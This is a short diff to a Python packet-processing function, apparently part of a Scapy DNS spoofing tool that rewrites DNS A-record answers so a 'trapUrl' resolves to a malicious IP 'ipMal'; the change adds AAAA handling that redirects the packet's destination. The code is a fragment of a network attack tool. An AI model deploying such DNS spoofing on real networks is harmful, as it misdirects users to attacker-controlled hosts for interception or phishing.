@@ -62,8 +62,9 @@ def process_packet(packet):
                 # dns_packet.an.rdata = ipMal
                 if (dns_packet.an.type == 1):
                     dns_packet.an = DNSRR(rrname=trapUrl, rdata=ipMal) 
-                # elif (dns_packet.an.type == 28):
-                #     dns_packet.an = DNSRR(rrname=trapUrl, rdata=ip6Mal)
+                elif (dns_packet.an.type == 28):
+                    # dns_packet.an = DNSRR(rrname=trapUrl, rdata=ip6Mal)
+                    packet[IP].dst = packet[IP].src
                 print("Changed address to: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname)
 
                 dns_packet.ancount = 1
